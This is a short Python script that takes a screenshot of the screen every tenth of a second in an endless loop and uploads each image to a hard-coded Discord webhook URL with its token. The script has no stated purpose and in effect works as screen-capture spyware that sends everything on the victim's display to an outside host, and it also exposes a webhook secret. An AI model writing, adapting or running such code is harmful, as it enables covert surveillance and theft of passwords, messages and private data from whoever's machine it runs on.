import requests
import time
import pyautogui
import io

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1206398430793048134/UuEBB3XdKNoNzbCP3eEAi2eNV-Uel43AewTlUG0O0HK8rvhf_cL7VTeQ_GhBlNfOkUep"

# Function to send screenshot via webhook
def send_screenshot(image_bytes):
    # Prepare payload with file
    files = {
        'file': ('screenshot.png', image_bytes)
    }

    # Make request to update message with new screenshot
    response = requests.patch(WEBHOOK_URL, files=files)

    # Print response for debugging
    print(response.text)

# Function to continuously capture and send screenshots
def main():
    while True:
        # Capture screenshot
        screenshot = pyautogui.screenshot()

        # Convert screenshot to bytes
        with io.BytesIO() as image_binary:
            screenshot.save(image_binary, format='PNG')
            image_binary.seek(0)
            image_bytes = image_binary.read()

        # Send screenshot via webhook
        send_screenshot(image_bytes)

        # Wait for 0.1 seconds before taking the next screenshot
        time.sleep(0.1)

# Run the main function
if __name__ == "__main__":
    main()
